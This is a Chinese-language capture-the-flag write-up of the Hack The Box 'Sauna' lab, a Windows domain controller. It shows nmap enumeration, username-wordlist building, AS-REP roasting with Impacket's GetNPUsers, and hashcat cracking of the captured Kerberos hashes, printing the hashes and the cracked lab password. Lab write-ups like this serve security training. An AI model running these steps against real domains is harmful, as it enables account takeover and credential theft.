---
title: HTB-Sauna Writeup
date: 2026-04-21T17:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ sudo nmap --min-rate 10000 -p- 10.129.22.120 -oA Nmap/ports
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-21 05:26 -0400
Nmap scan report for 10.129.22.120
Host is up (0.14s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49698/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.87 seconds
```

提取端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ',' 
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49698

```

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ sudo nmap -sT -sC -sV -O -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49698 10.129.22.120                                                                                                                
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-21 05:28 -0400
Nmap scan report for 10.129.22.120
Host is up (0.14s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-21 16:28:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-21T16:29:10
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.65 seconds
```

这是个域机器，添加 `hosts` 解析

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ sudo bash -c 'echo "10.129.22.120 egotistical-bank.local" >> /etc/hosts'
[sudo] password for kali: 
                                                                                                                              
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ tail -n 1 /etc/hosts
10.129.22.120 egotistical-bank.local
```

## Web-80 渗透

访问 80 界面，浏览发现很多人名，保存为一个字典。

![](Pasted%20image%2020260421174938.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ vim users.txt           
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ cat users.txt               
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb

```

进一步扩展字典。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ cat users.txt 
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
fergus
smith
shaun
coins
hugo
bear
bowie
taylor
sophie
driver
steven
kerb
```

查看 Kerberos 域认证。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]                                                                                           
└─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass  -dc-ip 10.129.22.120 egotistical-bank.local/ -usersfile users.txt 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
         
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

```

爆破失败，是不是字典的原因？再次扩充字典。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ cat users.txt 
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
fergus
smith
shaun
coins
hugo
bear
bowie
taylor
sophie
driver
steven
kerb
fergussmith
shauncoins
hugobear
bowietylor
sophiedriver
stevenkerb
administrator
Administrator
guest
Guest
fergus
Fergus
smith
Smith
fsmith
FSmith
Fsmith
smithf
SmithF
fergus.smith
Fergus.Smith
fergussmith
FergusSmith
f.smith
F.Smith
smith.f
Smith.F
shaun
Shaun
coins
Coins
scoins
SCoins
Scoins
coinss
shaun.coins
Shaun.Coins
shauncoins
ShaunCoins
s.coins
S.Coins
hugo
Hugo
bear
Bear
hbear
HBear
Hbear
bearh
hugo.bear
Hugo.Bear
hugobear
HugoBear
h.bear
H.Bear
bowie
Bowie
taylor
Taylor
btaylor
BTaylor
Btaylor
taylorb
bowie.taylor
Bowie.Taylor
bowietaylor
BowieTaylor
b.taylor
B.Taylor
sophie
Sophie
driver
Driver
sdriver
SDriver
Sdriver
drivers
sophie.driver
Sophie.Driver
sophiedriver
SophieDriver
s.driver
S.Driver
steven
Steven
kerb
Kerb
skerb
SKerb
Skerb
kerbs
steven.kerb
Steven.Kerb
stevenkerb
StevenKerb
s.kerb
S.Kerb
```

执行爆破。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass  -dc-ip 10.129.22.120 egotistical-bank.local/ -usersfile users.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6850f382cf535713343eed5dbe5945c8$c2fec4b43dbe3c498656c0edf0eace0879bd78887fe37115ff8ba01a39d192493a509d39cc4fa07dc9ded63189241a679ad645ab2b2fb2317cbf98788bd3873912914866b758ad680f04e8adbff310443eab1f96c80b794a7233c1f13b19b0a23b2fe90f831ae1c67573f419b3a3b134b143418b63236f508571a2540141907b3777e161dcca098d2a979b40b7bd4a7b37c0cae71ca16ef3025f9aa694c526c78b4d0cfb4310d8f33ac839aaa88b590ed4440413405cc0a245ccb5d45f80c3e248d4152f732dc3f15c57fec6478098e0dab8758d2238b4fe17b447929b6a9e0c72243f4eb9acac868833dadbebd9982812be7c73c93d1b5de2e673cfbef5d72c
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:acb677509f6d56992b59b00a1392c82a$0b08ccc1c3b03aac2406adc5e2910ab4c07608cc436352ac232576b8a3499ac11e62ecb39ac813ec5ef7ccc2e5a31e9a62d5a30e5e94700d06db7c55d166fb7cec8643c21e473e2ba70106e5a49ec5a6d34fa81c0d323cc26a023c6862fc4fdecf88b4171d0340bb791693dfae2f5776a532ec4f21fb8164a2b9281c648f85a6e632de45ee94dea5c06946bc83ae0fb80ca28a275f99dcdc95c7ce1b93358e233007ed51fab20a6fd49aee131227f4a5ca4fb92e60483fa10146e1ad01e31356f19455d6f992522d56d34aea97a61fbf0dd4ed037a0c2756c935eb6bd5cffc7b7b8603180c80289ef77d43d39c448575088eb512043e2e4afa1a27390b2bdd08
$krb5asrep$23$Fsmith@EGOTISTICAL-BANK.LOCAL:f40036799fd7669bfb8836b1b0706fd3$4f27a188189e6b40ce0ca6dd52339904c73383352ee22614a8c02b4d1fd2e7273b14951d0ac9a4b9bc1a1e2b0a85a4b558570875e747012742f79d6386afd0c4d8e89b875909db9901c3621232eb25ecb9630461ded0fc60864046367ace58f89842b0d8b3061e186a17a72c9e0d671ce4a4632d6d412649a57b0a8b3d93bdeab13e928d8777213c418cd01a1a85a3e55c7702653f80fc9a8113bdaa8dfd15fe74ca919eeaba144c4bde9b81eef1f1e60e04829114a82de8a850ebcaa743d4740fb4c00a299bfbbc5726b95bb209c364fce2690b89de08ac611008f1061da99b615b37f8125398b85d8394c70078b143d680b5ff450e14b6f297032e77cf0cde
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

```

爆破出用户 `fsmith` 有预认证。

```user_hash.txt
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6850f382cf535713343eed5dbe5945c8$c2fec4b43dbe3c498656c0edf0eace0879bd78887fe37115ff8ba01a39d192493a509d39cc4fa07dc9ded63189241a679ad645ab2b2fb2317cbf98788bd3873912914866b758ad680f04e8adbff310443eab1f96c80b794a7233c1f13b19b0a23b2fe90f831ae1c67573f419b3a3b134b143418b63236f508571a2540141907b3777e161dcca098d2a979b40b7bd4a7b37c0cae71ca16ef3025f9aa694c526c78b4d0cfb4310d8f33ac839aaa88b590ed4440413405cc0a245ccb5d45f80c3e248d4152f732dc3f15c57fec6478098e0dab8758d2238b4fe17b447929b6a9e0c72243f4eb9acac868833dadbebd9982812be7c73c93d1b5de2e673cfbef5d72c
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:acb677509f6d56992b59b00a1392c82a$0b08ccc1c3b03aac2406adc5e2910ab4c07608cc436352ac232576b8a3499ac11e62ecb39ac813ec5ef7ccc2e5a31e9a62d5a30e5e94700d06db7c55d166fb7cec8643c21e473e2ba70106e5a49ec5a6d34fa81c0d323cc26a023c6862fc4fdecf88b4171d0340bb791693dfae2f5776a532ec4f21fb8164a2b9281c648f85a6e632de45ee94dea5c06946bc83ae0fb80ca28a275f99dcdc95c7ce1b93358e233007ed51fab20a6fd49aee131227f4a5ca4fb92e60483fa10146e1ad01e31356f19455d6f992522d56d34aea97a61fbf0dd4ed037a0c2756c935eb6bd5cffc7b7b8603180c80289ef77d43d39c448575088eb512043e2e4afa1a27390b2bdd08
$krb5asrep$23$Fsmith@EGOTISTICAL-BANK.LOCAL:f40036799fd7669bfb8836b1b0706fd3$4f27a188189e6b40ce0ca6dd52339904c73383352ee22614a8c02b4d1fd2e7273b14951d0ac9a4b9bc1a1e2b0a85a4b558570875e747012742f79d6386afd0c4d8e89b875909db9901c3621232eb25ecb9630461ded0fc60864046367ace58f89842b0d8b3061e186a17a72c9e0d671ce4a4632d6d412649a57b0a8b3d93bdeab13e928d8777213c418cd01a1a85a3e55c7702653f80fc9a8113bdaa8dfd15fe74ca919eeaba144c4bde9b81eef1f1e60e04829114a82de8a850ebcaa743d4740fb4c00a299bfbbc5726b95bb209c364fce2690b89de08ac611008f1061da99b615b37f8125398b85d8394c70078b143d680b5ff450e14b6f297032e77cf0cde
```

使用 hashcat 爆破密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ hashcat -m 18200 user_hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27419 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:acb677509f6d56992b59b00a1392c82a$0b08ccc1c3b03aac2406adc5e2910ab4c07608cc436352ac232576b8a3499ac11e62ecb39ac813ec5ef7ccc2e5a31e9a62d5a30e5e94700d06db7c55d166fb7cec8643c21e473e2ba70106e5a49ec5a6d34fa81c0d323cc26a023c6862fc4fdecf88b4171d0340bb791693dfae2f5776a532ec4f21fb8164a2b9281c648f85a6e632de45ee94dea5c06946bc83ae0fb80ca28a275f99dcdc95c7ce1b93358e233007ed51fab20a6fd49aee131227f4a5ca4fb92e60483fa10146e1ad01e31356f19455d6f992522d56d34aea97a61fbf0dd4ed037a0c2756c935eb6bd5cffc7b7b8603180c80289ef77d43d39c448575088eb512043e2e4afa1a27390b2bdd08:Thestrokes23
$krb5asrep$23$Fsmith@EGOTISTICAL-BANK.LOCAL:f40036799fd7669bfb8836b1b0706fd3$4f27a188189e6b40ce0ca6dd52339904c73383352ee22614a8c02b4d1fd2e7273b14951d0ac9a4b9bc1a1e2b0a85a4b558570875e747012742f79d6386afd0c4d8e89b875909db9901c3621232eb25ecb9630461ded0fc60864046367ace58f89842b0d8b3061e186a17a72c9e0d671ce4a4632d6d412649a57b0a8b3d93bdeab13e928d8777213c418cd01a1a85a3e55c7702653f80fc9a8113bdaa8dfd15fe74ca919eeaba144c4bde9b81eef1f1e60e04829114a82de8a850ebcaa743d4740fb4c00a299bfbbc5726b95bb209c364fce2690b89de08ac611008f1061da99b615b37f8125398b85d8394c70078b143d680b5ff450e14b6f297032e77cf0cde:Thestrokes23
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6850f382cf535713343eed5dbe5945c8$c2fec4b43dbe3c498656c0edf0eace0879bd78887fe37115ff8ba01a39d192493a509d39cc4fa07dc9ded63189241a679ad645ab2b2fb2317cbf98788bd3873912914866b758ad680f04e8adbff310443eab1f96c80b794a7233c1f13b19b0a23b2fe90f831ae1c67573f419b3a3b134b143418b63236f508571a2540141907b3777e161dcca098d2a979b40b7bd4a7b37c0cae71ca16ef3025f9aa694c526c78b4d0cfb4310d8f33ac839aaa88b590ed4440413405cc0a245ccb5d45f80c3e248d4152f732dc3f15c57fec6478098e0dab8758d2238b4fe17b447929b6a9e0c72243f4eb9acac868833dadbebd9982812be7c73c93d1b5de2e673cfbef5d72c:Thestrokes23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: user_hash.txt
Time.Started.....: Tue Apr 21 06:05:02 2026 (8 secs)
Time.Estimated...: Tue Apr 21 06:05:10 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
